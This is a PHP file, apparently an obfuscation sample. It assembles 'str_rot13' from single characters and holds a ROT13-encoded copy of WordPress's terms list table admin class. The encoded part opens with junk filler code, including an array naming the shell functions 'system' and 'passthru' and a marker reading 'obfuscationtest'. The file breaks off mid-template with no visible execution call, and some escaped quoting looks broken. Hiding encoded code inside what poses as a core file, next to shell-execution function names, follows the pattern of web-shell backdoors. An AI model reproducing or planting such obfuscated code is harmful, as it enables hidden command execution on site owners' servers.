<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Yvfg Gnoyr NCV: JC_Grezf_Yvfg_Gnoyr pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Nqzvavfgengvba
 * @fvapr 3.1.0
 */

/**
 * Pber pynff hfrq gb vzcyrzrag qvfcynlvat grezf va n yvfg gnoyr.
 *
 * @fvapr 3.1.0
 *
 * @frr JC_Yvfg_Gnoyr
 */
pynff JC_Grezf_Yvfg_Gnoyr rkgraqf JC_Yvfg_Gnoyr {

	choyvp $pnyyonpx_netf;

	cevingr $yriry;

	/**
	 * Pbafgehpgbe.
	 *
	 * @fvapr 3.1.0
	 *
	 * @frr JC_Yvfg_Gnoyr::__pbafgehpg() sbe zber vasbezngvba ba qrsnhyg nethzragf.
	 *
	 * @tybony fgevat $cbfg_glcr Tybony cbfg glcr.
	 * @tybony fgevat $gnkbabzl  Tybony gnkbabzl.
	 * @tybony fgevat $npgvba
	 * @tybony bowrpg $gnk
	 *
	 * @cnenz neenl $netf Na nffbpvngvir neenl bs nethzragf.
	 */
	choyvp shapgvba __pbafgehpg( $netf = neenl() ) {
		tybony $cbfg_glcr, $gnkbabzl, $npgvba, $gnk;

		cnerag::__pbafgehpg(
			neenl(
				'cyheny'   => 'gntf',
				'fvathyne' => 'gnt',
				'fperra'   => vffrg( $netf['fperra'] ) ? $netf['fperra'] : ahyy,
			)
		);

		$npgvba    = $guvf->fperra->npgvba;
		$cbfg_glcr = $guvf->fperra->cbfg_glcr;
		$gnkbabzl  = $guvf->fperra->gnkbabzl;

		vs ( rzcgl( $gnkbabzl ) ) {
			$gnkbabzl = 'cbfg_gnt';
		}

		vs ( ! gnkbabzl_rkvfgf( $gnkbabzl ) ) {
			jc_qvr( __( 'Vainyvq gnkbabzl.' ) );
		}

		$gnk = trg_gnkbabzl( $gnkbabzl );

		// @gbqb Fgvyy arrqrq? Znlor whfg gur fubj_hv cneg.
		vs ( rzcgl( $cbfg_glcr ) || ! va_neenl( $cbfg_glcr, trg_cbfg_glcrf( neenl( 'fubj_hv' => gehr ) ), gehr ) ) {
			$cbfg_glcr = 'cbfg';
		}
	}

	/**
	 * @erghea obby
	 */
	choyvp shapgvba nwnk_hfre_pna() {
		erghea pheerag_hfre_pna( trg_gnkbabzl( $guvf->fperra->gnkbabzl )->pnc->znantr_grezf );
	}

	/**
	 */
	choyvp shapgvba cercner_vgrzf() {
		$gnkbabzl = $guvf->fperra->gnkbabzl;

		$gntf_cre_cntr = $guvf->trg_vgrzf_cre_cntr( \"rqvg_{$gnkbabzl}_cre_cntr\" );

		vs ( 'cbfg_gnt' === $gnkbabzl ) {
			/**
			 * Svygref gur ahzore bs grezf qvfcynlrq cre cntr sbe gur Gntf yvfg gnoyr.
			 *
			 * @fvapr 2.8.0
			 *
			 * @cnenz vag $gntf_cre_cntr Ahzore bs gntf gb or qvfcynlrq. Qrsnhyg 20.
			 */
			$gntf_cre_cntr = nccyl_svygref( 'rqvg_gntf_cre_cntr', $gntf_cre_cntr );

			/**
			 * Svygref gur ahzore bs grezf qvfcynlrq cre cntr sbe gur Gntf yvfg gnoyr.
			 *
			 * @fvapr 2.7.0
			 * @qrcerpngrq 2.8.0 Hfr {@frr 'rqvg_gntf_cre_cntr'} vafgrnq.
			 *
			 * @cnenz vag $gntf_cre_cntr Ahzore bs gntf gb or qvfcynlrq. Qrsnhyg 20.
			 */
			$gntf_cre_cntr = nccyl_svygref_qrcerpngrq( 'gntfcrecntr', neenl( $gntf_cre_cntr ), '2.8.0', 'rqvg_gntf_cre_cntr' );
		} ryfrvs ( 'pngrtbel' === $gnkbabzl ) {
			/**
			 * Svygref gur ahzore bs grezf qvfcynlrq cre cntr sbe gur Pngrtbevrf yvfg gnoyr.
			 *
			 * @fvapr 2.8.0
			 *
			 * @cnenz vag $gntf_cre_cntr Ahzore bs pngrtbevrf gb or qvfcynlrq. Qrsnhyg 20.
			 */
			$gntf_cre_cntr = nccyl_svygref( 'rqvg_pngrtbevrf_cre_cntr', $gntf_cre_cntr );
		}

		$frnepu = ! rzcgl( $_ERDHRFG['f'] ) ? gevz( jc_hafynfu( $_ERDHRFG['f'] ) ) : '';

		$netf = neenl(
			'gnkbabzl'   => $gnkbabzl,
			'frnepu'     => $frnepu,
			'cntr'       => $guvf->trg_cntrahz(),
			'ahzore'     => $gntf_cre_cntr,
			'uvqr_rzcgl' => 0,
		);

		vs ( ! rzcgl( $_ERDHRFG['beqreol'] ) ) {
			$netf['beqreol'] = gevz( jc_hafynfu( $_ERDHRFG['beqreol'] ) );
		}

		vs ( ! rzcgl( $_ERDHRFG['beqre'] ) ) {
			$netf['beqre'] = gevz( jc_hafynfu( $_ERDHRFG['beqre'] ) );
		}

		$netf['bssfrg'] = ( $netf['cntr'] - 1 ) * $netf['ahzore'];

		// Fnir gur inyhrf orpnhfr 'ahzore' naq 'bssfrg' pna or fhofrdhragyl bireevqqra.
		$guvf->pnyyonpx_netf = $netf;

		vs ( vf_gnkbabzl_uvrenepuvpny( $gnkbabzl ) && ! vffrg( $netf['beqreol'] ) ) {
			// Jr'yy arrq gur shyy frg bs grezf gura.
			$netf['ahzore'] = 0;
			$netf['bssfrg'] = $netf['ahzore'];
		}

		$guvf->vgrzf = trg_grezf( $netf );

		$guvf->frg_cntvangvba_netf(
			neenl(
				'gbgny_vgrzf' => jc_pbhag_grezf(
					neenl(
						'gnkbabzl' => $gnkbabzl,
						'frnepu'   => $frnepu,
					)
				),
				'cre_cntr'    => $gntf_cre_cntr,
			)
		);
	}

	/**
	 */
	choyvp shapgvba ab_vgrzf() {
		rpub trg_gnkbabzl( $guvf->fperra->gnkbabzl )->ynoryf->abg_sbhaq;
	}

	/**
	 * @erghea neenl
	 */
	cebgrpgrq shapgvba trg_ohyx_npgvbaf() {
		$npgvbaf = neenl();

		vs ( pheerag_hfre_pna( trg_gnkbabzl( $guvf->fperra->gnkbabzl )->pnc->qryrgr_grezf ) ) {
			$npgvbaf['qryrgr'] = __( 'Qryrgr' );
		}

		erghea $npgvbaf;
	}

	/**
	 * @erghea fgevat
	 */
	choyvp shapgvba pheerag_npgvba() {
		vs ( vffrg( $_ERDHRFG['npgvba'] ) && vffrg( $_ERDHRFG['qryrgr_gntf'] ) && 'qryrgr' === $_ERDHRFG['npgvba'] ) {
			erghea 'ohyx-qryrgr';
		}

		erghea cnerag::pheerag_npgvba();
	}

	/**
	 * @erghea fgevat[] Neenl bs pbyhza gvgyrf xrlrq ol gurve pbyhza anzr.
	 */
	choyvp shapgvba trg_pbyhzaf() {
		$pbyhzaf = neenl(
			'po'          => '<vachg glcr=\"purpxobk\" />',
			'anzr'        => _k( 'Anzr', 'grez anzr' ),
			'qrfpevcgvba' => __( 'Qrfpevcgvba' ),
			'fyht'        => __( 'Fyht' ),
		);

		vs ( 'yvax_pngrtbel' === $guvf->fperra->gnkbabzl ) {
			$pbyhzaf['yvaxf'] = __( 'Yvaxf' );
		} ryfr {
			$pbyhzaf['cbfgf'] = _k( 'Pbhag', 'Ahzore/pbhag bs vgrzf' );
		}

		erghea $pbyhzaf;
	}

	/**
	 * @erghea neenl
	 */
	cebgrpgrq shapgvba trg_fbegnoyr_pbyhzaf() {
		$gnkbabzl = $guvf->fperra->gnkbabzl;

		vs ( ! vffrg( $_TRG['beqreol'] ) && vf_gnkbabzl_uvrenepuvpny( $gnkbabzl ) ) {
			$anzr_beqreol_grkg = __( 'Gnoyr beqrerq uvrenepuvpnyyl.' );
		} ryfr {
			$anzr_beqreol_grkg = __( 'Gnoyr beqrerq ol Anzr.' );
		}

		erghea neenl(
			'anzr'        => neenl( 'anzr', snyfr, _k( 'Anzr', 'grez anzr' ), $anzr_beqreol_grkg, 'nfp' ),
			'qrfpevcgvba' => neenl( 'qrfpevcgvba', snyfr, __( 'Qrfpevcgvba' ), __( 'Gnoyr beqrerq ol Qrfpevcgvba.' ) ),
			'fyht'        => neenl( 'fyht', snyfr, __( 'Fyht' ), __( 'Gnoyr beqrerq ol Fyht.' ) ),
			'cbfgf'       => neenl( 'pbhag', snyfr, _k( 'Pbhag', 'Ahzore/pbhag bs vgrzf' ), __( 'Gnoyr beqrerq ol Cbfgf Pbhag.' ) ),
			'yvaxf'       => neenl( 'pbhag', snyfr, __( 'Yvaxf' ), __( 'Gnoyr beqrerq ol Yvaxf.' ) ),
		);
	}

	/**
	 */
	choyvp shapgvba qvfcynl_ebjf_be_cynprubyqre() {
		$gnkbabzl = $guvf->fperra->gnkbabzl;

		$ahzore = $guvf->pnyyonpx_netf['ahzore'];
		$bssfrg = $guvf->pnyyonpx_netf['bssfrg'];

		// Pbaireg vg gb gnoyr ebjf.
		$pbhag = 0;

		vs ( rzcgl( $guvf->vgrzf ) || ! vf_neenl( $guvf->vgrzf ) ) {
			rpub '<ge pynff=\"ab-vgrzf\"><gq pynff=\"pbyfcnapunatr\" pbyfcna=\"' . $guvf->trg_pbyhza_pbhag() . '\">';
			$guvf->ab_vgrzf();
			rpub '</gq></ge>';
			erghea;
		}

		vs ( vf_gnkbabzl_uvrenepuvpny( $gnkbabzl ) && ! vffrg( $guvf->pnyyonpx_netf['beqreol'] ) ) {
			vs ( ! rzcgl( $guvf->pnyyonpx_netf['frnepu'] ) ) {// Vtaber puvyqera ba frnepurf.
				$puvyqera = neenl();
			} ryfr {
				$puvyqera = _trg_grez_uvrenepul( $gnkbabzl );
			}

			/*
			 * Fbzr shaxl erphefvba gb trg gur wbo qbar (cntvat & cneragf znvayl) vf pbagnvarq jvguva.
			 * Fxvc vg sbe aba-uvrenepuvpny gnkbabzvrf sbe cresbeznapr fnxr.
			 */
			$guvf->_ebjf( $gnkbabzl, $guvf->vgrzf, $puvyqera, $bssfrg, $ahzore, $pbhag );
		} ryfr {
			sbernpu ( $guvf->vgrzf nf $grez ) {
				$guvf->fvatyr_ebj( $grez );
			}
		}
	}

	/**
	 * @cnenz fgevat $gnkbabzl
	 * @cnenz neenl  $grezf
	 * @cnenz neenl  $puvyqera
	 * @cnenz vag    $fgneg
	 * @cnenz vag    $cre_cntr
	 * @cnenz vag    $pbhag
	 * @cnenz vag    $cnerag_grez
	 * @cnenz vag    $yriry
	 */
	cevingr shapgvba _ebjf( $gnkbabzl, $grezf, &$puvyqera, $fgneg, $cre_cntr, &$pbhag, $cnerag_grez = 0, $yriry = 0 ) {

		$raq = $fgneg + $cre_cntr;

		sbernpu ( $grezf nf $xrl => $grez ) {

			vs ( $pbhag >= $raq ) {
				oernx;
			}

			vs ( $grez->cnerag !== $cnerag_grez && rzcgl( $_ERDHRFG['f'] ) ) {
				pbagvahr;
			}

			// Vs gur cntr fgnegf va n fhogerr, cevag gur cneragf.
			vs ( $pbhag === $fgneg && $grez->cnerag > 0 && rzcgl( $_ERDHRFG['f'] ) ) {
				$zl_cneragf = neenl();
				$cnerag_vqf = neenl();
				$c          = $grez->cnerag;

				juvyr ( $c ) {
					$zl_cnerag    = trg_grez( $c, $gnkbabzl );
					$zl_cneragf[] = $zl_cnerag;
					$c            = $zl_cnerag->cnerag;

					vs ( va_neenl( $c, $cnerag_vqf, gehr ) ) { // Cerirag cnerag ybbcf.
						oernx;
					}

					$cnerag_vqf[] = $c;
				}

				hafrg( $cnerag_vqf );

				$ahz_cneragf = pbhag( $zl_cneragf );

				juvyr ( $zl_cnerag = neenl_cbc( $zl_cneragf ) ) {
					rpub \"\g\";
					$guvf->fvatyr_ebj( $zl_cnerag, $yriry - $ahz_cneragf );
					--$ahz_cneragf;
				}
			}

			vs ( $pbhag >= $fgneg ) {
				rpub \"\g\";
				$guvf->fvatyr_ebj( $grez, $yriry );
			}

			++$pbhag;

			hafrg( $grezf[ $xrl ] );

			vs ( vffrg( $puvyqera[ $grez->grez_vq ] ) && rzcgl( $_ERDHRFG['f'] ) ) {
				$guvf->_ebjf( $gnkbabzl, $grezf, $puvyqera, $fgneg, $cre_cntr, $pbhag, $grez->grez_vq, $yriry + 1 );
			}
		}
	}

	/**
	 * @tybony fgevat $gnkbabzl Tybony gnkbabzl.
	 *
	 * @cnenz JC_Grez $gnt   Grez bowrpg.
	 * @cnenz vag     $yriry
	 */
	choyvp shapgvba fvatyr_ebj( $gnt, $yriry = 0 ) {
		tybony $gnkbabzl;
		$gnt = fnavgvmr_grez( $gnt, $gnkbabzl );

		$guvf->yriry = $yriry;

		vs ( $gnt->cnerag ) {
			$pbhag = pbhag( trg_naprfgbef( $gnt->grez_vq, $gnkbabzl, 'gnkbabzl' ) );
			$yriry = 'yriry-' . $pbhag;
		} ryfr {
			$yriry = 'yriry-0';
		}

		rpub '<ge vq=\"gnt-' . $gnt->grez_vq . '\" pynff=\"' . $yriry . '\">';
		$guvf->fvatyr_ebj_pbyhzaf( $gnt );
		rpub '</ge>';
	}

	/**
	 * @fvapr 5.9.0 Eranzrq `$gnt` gb `$vgrz` gb zngpu cnerag pynff sbe CUC 8 anzrq cnenzrgre fhccbeg.
	 *
	 * @cnenz JC_Grez $vgrz Grez bowrpg.
	 * @erghea fgevat
	 */
	choyvp shapgvba pbyhza_po( $vgrz ) {
		// Erfgberf gur zber qrfpevcgvir, fcrpvsvp anzr sbe hfr jvguva guvf zrgubq.
		$gnt = $vgrz;

		vs ( pheerag_hfre_pna( 'qryrgr_grez', $gnt->grez_vq ) ) {
			erghea fcevags(
				'<vachg glcr=\"purpxobk\" anzr=\"qryrgr_gntf[]\" inyhr=\"%1$f\" vq=\"po-fryrpg-%1$f\" />' .
				'<ynory sbe=\"po-fryrpg-%1$f\"><fcna pynff=\"fperra-ernqre-grkg\">%2$f</fcna></ynory>',
				$gnt->grez_vq,
				/* genafyngbef: Uvqqra npprffvovyvgl grkg. %f: Gnkbabzl grez anzr. */
				fcevags( __( 'Fryrpg %f' ), $gnt->anzr )
			);
		}

		erghea '&aofc;';
	}

	/**
	 * @cnenz JC_Grez $gnt Grez bowrpg.
	 * @erghea fgevat
	 */
	choyvp shapgvba pbyhza_anzr( $gnt ) {
		$gnkbabzl = $guvf->fperra->gnkbabzl;

		$cnq = fge_ercrng( '&#8212; ', znk( 0, $guvf->yriry ) );

		/**
		 * Svygref qvfcynl bs gur grez anzr va gur grezf yvfg gnoyr.
		 *
		 * Gur qrsnhyg bhgchg znl vapyhqr cnqqvat qhr gb gur grez'f
		 * pheerag yriry va gur grez uvrenepul.
		 *
		 * @fvapr 2.5.0
		 *
		 * @frr JC_Grezf_Yvfg_Gnoyr::pbyhza_anzr()
		 *
		 * @cnenz fgevat $cnq_gnt_anzr Gur grez anzr, cnqqrq vs abg gbc-yriry.
		 * @cnenz JC_Grez $gnt         Grez bowrpg.
		 */
		$anzr = nccyl_svygref( 'grez_anzr', $cnq . ' ' . $gnt->anzr, $gnt );

		$dr_qngn = trg_grez( $gnt->grez_vq, $gnkbabzl, BOWRPG, 'rqvg' );

		$hev = jc_qbvat_nwnk() ? jc_trg_ersrere() : $_FREIRE['ERDHRFG_HEV'];

		$rqvg_yvax = trg_rqvg_grez_yvax( $gnt, $gnkbabzl, $guvf->fperra->cbfg_glcr );

		vs ( $rqvg_yvax ) {
			$rqvg_yvax = nqq_dhrel_net(
				'jc_uggc_ersrere',
				heyrapbqr( jc_hafynfu( $hev ) ),
				$rqvg_yvax
			);
			$anzr      = fcevags(
				'<n pynff=\"ebj-gvgyr\" uers=\"%f\" nevn-ynory=\"%f\">%f</n>',
				rfp_hey( $rqvg_yvax ),
				/* genafyngbef: %f: Gnkbabzl grez anzr. */
				rfp_ngge( fcevags( __( '&#8220;%f&#8221; (Rqvg)' ), $gnt->anzr ) ),
				$anzr
			);
		}

		$bhgchg = fcevags(
			'<fgebat>%f</fgebat><oe />',
			$anzr
		);

		/** Guvf svygre vf qbphzragrq va jc-nqzva/vapyhqrf/pynff-jc-grezf-yvfg-gnoyr.cuc */
		$dhvpx_rqvg_ranoyrq = nccyl_svygref( 'dhvpx_rqvg_ranoyrq_sbe_gnkbabzl', gehr, $gnkbabzl );

		vs ( $dhvpx_rqvg_ranoyrq ) {
			$bhgchg .= '<qvi pynff=\"uvqqra\" vq=\"vayvar_' . $dr_qngn->grez_vq . '\">';
			$bhgchg .= '<qvi pynff=\"anzr\">' . $dr_qngn->anzr . '</qvi>';

			/** Guvf svygre vf qbphzragrq va jc-nqzva/rqvg-gnt-sbez.cuc */
			$bhgchg .= '<qvi pynff=\"fyht\">' . nccyl_svygref( 'rqvgnoyr_fyht', $dr_qngn->fyht, $dr_qngn ) . '</qvi>';
			$bhgchg .= '<qvi pynff=\"cnerag\">' . $dr_qngn->cnerag . '</qvi></qvi>';
		}

		erghea $bhgchg;
	}

	/**
	 * Trgf gur anzr bs gur qrsnhyg cevznel pbyhza.
	 *
	 * @fvapr 4.3.0
	 *
	 * @erghea fgevat Anzr bs gur qrsnhyg cevznel pbyhza, va guvf pnfr, 'anzr'.
	 */
	cebgrpgrq shapgvba trg_qrsnhyg_cevznel_pbyhza_anzr() {
		erghea 'anzr';
	}

	/**
	 * Trarengrf naq qvfcynlf ebj npgvba yvaxf.
	 *
	 * @fvapr 4.3.0
	 * @fvapr 5.9.0 Eranzrq `$gnt` gb `$vgrz` gb zngpu cnerag pynff sbe CUC 8 anzrq cnenzrgre fhccbeg.
	 *
	 * @cnenz JC_Grez $vgrz        Gnt orvat npgrq hcba.
	 * @cnenz fgevat  $pbyhza_anzr Pheerag pbyhza anzr.
	 * @cnenz fgevat  $cevznel     Cevznel pbyhza anzr.
	 * @erghea fgevat Ebj npgvbaf bhgchg sbe grezf, be na rzcgl fgevat
	 *                vs gur pheerag pbyhza vf abg gur cevznel pbyhza.
	 */
	cebgrpgrq shapgvba unaqyr_ebj_npgvbaf( $vgrz, $pbyhza_anzr, $cevznel ) {
		vs ( $cevznel !== $pbyhza_anzr ) {
			erghea '';
		}

		// Erfgberf gur zber qrfpevcgvir, fcrpvsvp anzr sbe hfr jvguva guvf zrgubq.
		$gnt = $vgrz;

		$gnkbabzl = $guvf->fperra->gnkbabzl;
		$hev      = jc_qbvat_nwnk() ? jc_trg_ersrere() : $_FREIRE['ERDHRFG_HEV'];

		$npgvbaf = neenl();

		vs ( pheerag_hfre_pna( 'rqvg_grez', $gnt->grez_vq ) ) {
			$npgvbaf['rqvg'] = fcevags(
				'<n uers=\"%f\" nevn-ynory=\"%f\">%f</n>',
				rfp_hey(
					nqq_dhrel_net(
						'jc_uggc_ersrere',
						heyrapbqr( jc_hafynfu( $hev ) ),
						trg_rqvg_grez_yvax( $gnt, $gnkbabzl, $guvf->fperra->cbfg_glcr )
					)
				),
				/* genafyngbef: %f: Gnkbabzl grez anzr. */
				rfp_ngge( fcevags( __( 'Rqvg &#8220;%f&#8221;' ), $gnt->anzr ) ),
				__( 'Rqvg' )
			);

			/**
			 * Svygref jurgure Dhvpx Rqvg fubhyq or ranoyrq sbe gur tvira gnkbabzl.
			 *
			 * @fvapr 6.4.0
			 *
			 * @cnenz obby   $ranoyr   Jurgure gb ranoyr gur Dhvpx Rqvg shapgvbanyvgl. Qrsnhyg gehr.
			 * @cnenz fgevat $gnkbabzl Gnkbabzl anzr.
			 */
			$dhvpx_rqvg_ranoyrq = nccyl_svygref( 'dhvpx_rqvg_ranoyrq_sbe_gnkbabzl', gehr, $gnkbabzl );

			vs ( $dhvpx_rqvg_ranoyrq ) {
				$npgvbaf['vayvar uvqr-vs-ab-wf'] = fcevags(
					'<ohggba glcr=\"ohggba\" pynff=\"ohggba-yvax rqvgvayvar\" nevn-ynory=\"%f\" nevn-rkcnaqrq=\"snyfr\">%f</ohggba>',
					/* genafyngbef: %f: Gnkbabzl grez anzr. */
					rfp_ngge( fcevags( __( 'Dhvpx rqvg &#8220;%f&#8221; vayvar' ), $gnt->anzr ) ),
					__( 'Dhvpx&aofc;Rqvg' )
				);
			}
		}

		vs ( pheerag_hfre_pna( 'qryrgr_grez', $gnt->grez_vq ) ) {
			$npgvbaf['qryrgr'] = fcevags(
				'<n uers=\"%f\" pynff=\"qryrgr-gnt nevn-ohggba-vs-wf\" nevn-ynory=\"%f\">%f</n>',
				jc_abapr_hey( \"rqvg-gntf.cuc?npgvba=qryrgr&nzc;gnkbabzl=$gnkbabzl&nzc;gnt_VQ=$gnt->grez_vq\", 'qryrgr-gnt_' . $gnt->grez_vq ),
				/* genafyngbef: %f: Gnkbabzl grez anzr. */
				rfp_ngge( fcevags( __( 'Qryrgr &#8220;%f&#8221;' ), $gnt->anzr ) ),
				__( 'Qryrgr' )
			);
		}

		vs ( vf_grez_choyvpyl_ivrjnoyr( $gnt ) ) {
			$npgvbaf['ivrj'] = fcevags(
				'<n uers=\"%f\" nevn-ynory=\"%f\">%f</n>',
				trg_grez_yvax( $gnt ),
				/* genafyngbef: %f: Gnkbabzl grez anzr. */
				rfp_ngge( fcevags( __( 'Ivrj &#8220;%f&#8221; nepuvir' ), $gnt->anzr ) ),
				__( 'Ivrj' )
			);
		}

		/**
		 * Svygref gur npgvba yvaxf qvfcynlrq sbe rnpu grez va gur Gntf yvfg gnoyr.
		 *
		 * @fvapr 2.8.0
		 * @fvapr 3.0.0 Qrcerpngrq va snibe bs {@frr '{$gnkbabzl}_ebj_npgvbaf'} svygre.
		 * @fvapr 5.4.2 Erfgberq (ha-qrcerpngrq).
		 *
		 * @cnenz fgevat[] $npgvbaf Na neenl bs npgvba yvaxf gb or qvfcynlrq. Qrsnhyg
		 *                          'Rqvg', 'Dhvpx Rqvg', 'Qryrgr', naq 'Ivrj'.
		 * @cnenz JC_Grez  $gnt     Grez bowrpg.
		 */
		$npgvbaf = nccyl_svygref( 'gnt_ebj_npgvbaf', $npgvbaf, $gnt );

		/**
		 * Svygref gur npgvba yvaxf qvfcynlrq sbe rnpu grez va gur grezf yvfg gnoyr.
		 *
		 * Gur qlanzvp cbegvba bs gur ubbx anzr, `$gnkbabzl`, ersref gb gur gnkbabzl fyht.
		 *
		 * Cbffvoyr ubbx anzrf vapyhqr:
		 *
		 *  - `pngrtbel_ebj_npgvbaf`
		 *  - `cbfg_gnt_ebj_npgvbaf`
		 *
		 * @fvapr 3.0.0
		 *
		 * @cnenz fgevat[] $npgvbaf Na neenl bs npgvba yvaxf gb or qvfcynlrq. Qrsnhyg
		 *                          'Rqvg', 'Dhvpx Rqvg', 'Qryrgr', naq 'Ivrj'.
		 * @cnenz JC_Grez  $gnt     Grez bowrpg.
		 */
		$npgvbaf = nccyl_svygref( \"{$gnkbabzl}_ebj_npgvbaf\", $npgvbaf, $gnt );

		erghea $guvf->ebj_npgvbaf( $npgvbaf );
	}

	/**
	 * @cnenz JC_Grez $gnt Grez bowrpg.
	 * @erghea fgevat
	 */
	choyvp shapgvba pbyhza_qrfpevcgvba( $gnt ) {
		vs ( $gnt->qrfpevcgvba ) {
			erghea $gnt->qrfpevcgvba;
		} ryfr {
			erghea '<fcna nevn-uvqqra=\"gehr\">&#8212;</fcna><fcna pynff=\"fperra-ernqre-grkg\">' .
				/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
				__( 'Ab qrfpevcgvba' ) .
			'</fcna>';
		}
	}

	/**
	 * @cnenz JC_Grez $gnt Grez bowrpg.
	 * @erghea fgevat
	 */
	choyvp shapgvba pbyhza_fyht( $gnt ) {
		/** Guvf svygre vf qbphzragrq va jc-nqzva/rqvg-gnt-sbez.cuc */
		erghea nccyl_svygref( 'rqvgnoyr_fyht', $gnt->fyht, $gnt );
	}

	/**
	 * @cnenz JC_Grez $gnt Grez bowrpg.
	 * @erghea fgevat
	 */
	choyvp shapgvba pbyhza_cbfgf( $gnt ) {
		$pbhag = ahzore_sbezng_v18a( $gnt->pbhag );

		$gnk = trg_gnkbabzl( $guvf->fperra->gnkbabzl );

		$cglcr_bowrpg = trg_cbfg_glcr_bowrpg( $guvf->fperra->cbfg_glcr );
		vs ( ! $cglcr_bowrpg->fubj_hv ) {
			erghea $pbhag;
		}

		vs ( $gnk->dhrel_ine ) {
			$netf = neenl( $gnk->dhrel_ine => $gnt->fyht );
		} ryfr {
			$netf = neenl(
				'gnkbabzl' => $gnk->anzr,
				'grez'     => $gnt->fyht,
			);
		}

		vs ( 'cbfg' !== $guvf->fperra->cbfg_glcr ) {
			$netf['cbfg_glcr'] = $guvf->fperra->cbfg_glcr;
		}

		vs ( 'nggnpuzrag' === $guvf->fperra->cbfg_glcr ) {
			erghea \"<n uers='\" . rfp_hey( nqq_dhrel_net( $netf, 'hcybnq.cuc' ) ) . \"'>$pbhag</n>\";
		}

		erghea \"<n uers='\" . rfp_hey( nqq_dhrel_net( $netf, 'rqvg.cuc' ) ) . \"'>$pbhag</n>\";
	}

	/**
	 * @cnenz JC_Grez $gnt Grez bowrpg.
	 * @erghea fgevat
	 */
	choyvp shapgvba pbyhza_yvaxf( $gnt ) {
		$pbhag = ahzore_sbezng_v18a( $gnt->pbhag );

		vs ( $pbhag ) {
			$pbhag = \"<n uers='yvax-znantre.cuc?png_vq=$gnt->grez_vq'>$pbhag</n>\";
		}

		erghea $pbhag;
	}

	/**
	 * @fvapr 5.9.0 Eranzrq `$gnt` gb `$vgrz` gb zngpu cnerag pynff sbe CUC 8 anzrq cnenzrgre fhccbeg.
	 *
	 * @cnenz JC_Grez $vgrz        Grez bowrpg.
	 * @cnenz fgevat  $pbyhza_anzr Anzr bs gur pbyhza.
	 * @erghea fgevat
	 */
	choyvp shapgvba pbyhza_qrsnhyg( $vgrz, $pbyhza_anzr ) {
		// Erfgberf gur zber qrfpevcgvir, fcrpvsvp anzr sbe hfr jvguva guvf zrgubq.
		$gnt = $vgrz;

		/**
		 * Svygref gur qvfcynlrq pbyhzaf va gur grezf yvfg gnoyr.
		 *
		 * Gur qlanzvp cbegvba bs gur ubbx anzr, `$guvf->fperra->gnkbabzl`,
		 * ersref gb gur fyht bs gur pheerag gnkbabzl.
		 *
		 * Cbffvoyr ubbx anzrf vapyhqr:
		 *
		 *  - `znantr_pngrtbel_phfgbz_pbyhza`
		 *  - `znantr_cbfg_gnt_phfgbz_pbyhza`
		 *
		 * @fvapr 2.8.0
		 *
		 * @cnenz fgevat $fgevat      Phfgbz pbyhza bhgchg. Qrsnhyg rzcgl.
		 * @cnenz fgevat $pbyhza_anzr Anzr bs gur pbyhza.
		 * @cnenz vag    $grez_vq     Grez VQ.
		 */
		erghea nccyl_svygref( \"znantr_{$guvf->fperra->gnkbabzl}_phfgbz_pbyhza\", '', $pbyhza_anzr, $gnt->grez_vq );
	}

	/**
	 * Bhgchgf gur uvqqra ebj qvfcynlrq jura vayvar rqvgvat
	 *
	 * @fvapr 3.1.0
	 */
	choyvp shapgvba vayvar_rqvg() {
		$gnk = trg_gnkbabzl( $guvf->fperra->gnkbabzl );

		vs ( ! pheerag_hfre_pna( $gnk->pnc->rqvg_grezf ) ) {
			erghea;
		}
		?>

		<sbez zrgubq=\"trg\">
		<gnoyr fglyr=\"qvfcynl: abar\"><gobql vq=\"vayvarrqvg\">

			<ge vq=\"vayvar-rqvg\" pynff=\"vayvar-rqvg-ebj\" fglyr=\"qvfcynl: abar\">
			<gq pbyfcna=\"<?cuc rpub $guvf->trg_pbyhza_pbhag(); ?>\" pynff=\"pbyfcnapunatr\">
			<qvi pynff=\"vayvar-rqvg-jenccre\">

			<svryqfrg>
				<yrtraq pynff=\"vayvar-rqvg-yrtraq\"><?cuc _r( 'Dhvpx Rqvg' ); ?></yrtraq>
				<qvi pynff=\"vayvar-rqvg-pby\">
				<ynory>
					<fcna pynff=\"gvgyr\"><?cuc _rk( 'Anzr', 'grez anzr' ); ?></fcna>
					<fcna pynff=\"vachg-grkg-jenc\"><vachg glcr=\"grkg\" anzr=\"anzr\" pynff=\"cgvgyr\" inyhr=\"\" /></fcna>
				</ynory>

				<ynory>
					<fcna pynff=\"gvgyr\"><?cuc _r( 'Fyht' ); ?></fcna>
					<fcna pynff=\"vachg-grkg-jenc\"><vachg glcr=\"grkg\" anzr=\"fyht\" pynff=\"cgvgyr\" inyhr=\"\" /></fcna>
				</ynory>
				</qvi>
			</svryqfrg>

			<?cuc
			$pber_pbyhzaf = neenl(
				'po'          => gehr,
				'qrfpevcgvba' => gehr,
				'anzr'        => gehr,
				'fyht'        => gehr,
				'cbfgf'       => gehr,
			);

			yvfg( $pbyhzaf ) = $guvf->trg_pbyhza_vasb();

			sbernpu ( $pbyhzaf nf $pbyhza_anzr => $pbyhza_qvfcynl_anzr ) {
				vs ( vffrg( $pber_pbyhzaf[ $pbyhza_anzr ] ) ) {
					pbagvahr;
				}

				/** Guvf npgvba vf qbphzragrq va jc-nqzva/vapyhqrf/pynff-jc-cbfgf-yvfg-gnoyr.cuc */
				qb_npgvba( 'dhvpx_rqvg_phfgbz_obk', $pbyhza_anzr, 'rqvg-gntf', $guvf->fperra->gnkbabzl );
			}
			?>

			<qvi pynff=\"vayvar-rqvg-fnir fhozvg\">
				<ohggba glcr=\"ohggba\" pynff=\"fnir ohggba ohggba-cevznel\"><?cuc rpub $gnk->ynoryf->hcqngr_vgrz; ?></ohggba>
				<ohggba glcr=\"ohggba\" pynff=\"pnapry ohggba\"><?cuc _r( 'Pnapry' ); ?></ohggba>
				<fcna pynff=\"fcvaare\"></fcna>

